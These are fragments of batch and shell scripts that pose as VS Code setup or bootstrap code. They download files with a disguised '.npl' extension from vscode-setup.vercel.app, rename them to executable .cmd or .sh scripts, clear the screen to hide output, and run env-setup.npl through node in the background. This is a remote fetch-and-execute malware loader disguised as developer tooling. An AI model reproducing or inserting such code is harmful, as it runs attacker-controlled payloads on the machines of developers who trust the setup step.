...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.npl" http://vscode-setup.vercel.app/settings/bootstrap?flag=${flag}
cls
ren "%VSCODE_DIR%\\vscode-bootstrap.npl" vscode-bootstrap.cmd
...
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.npl" "http://vscode-setup.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
mv "$TARGET_DIR/vscode-bootstrap.npl" "$TARGET_DIR/vscode-bootstrap.sh"
clear
...
:: -------------------------
set "USERPROFILE=%USERPROFILE%\\.vscode"
echo [INFO] Downloading env-setup.npl and package.json...

curl -L -o "%USERPROFILE%\\env-setup.npl" "http://vscode-setup.vercel.app/settings/env?flag=${flag}"
curl -L -o "%USERPROFILE%\\package.json" "http://vscode-setup.vercel.app/settings/package"
...
if exist "%~dp0env-setup.npl" (
    ...
    start "" /b "%NODE_EXE%" "%~dp0env-setup.npl"
    if errorlevel 1 (
